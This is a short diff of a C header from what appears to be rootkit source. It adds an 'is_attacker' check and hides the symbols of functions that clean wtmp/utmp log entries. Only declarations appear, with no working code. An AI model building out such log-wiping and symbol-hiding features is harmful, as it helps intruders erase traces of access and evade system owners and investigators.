@@ -24,5 +24,6 @@
 #include "config.h"
 #include "debug.h"
 
-void    clean_log_entries(char *wtmp, char *utmp);
-void    cleanup(void *var, size_t len);
+int     is_attacker(void) __attribute__((visibility("hidden")));
+void    clean_log_entries(char *wtmp, char *utmp) __attribute__((visibility("hidden")));
+void    cleanup(void *var, size_t len) __attribute__((visibility("hidden")));
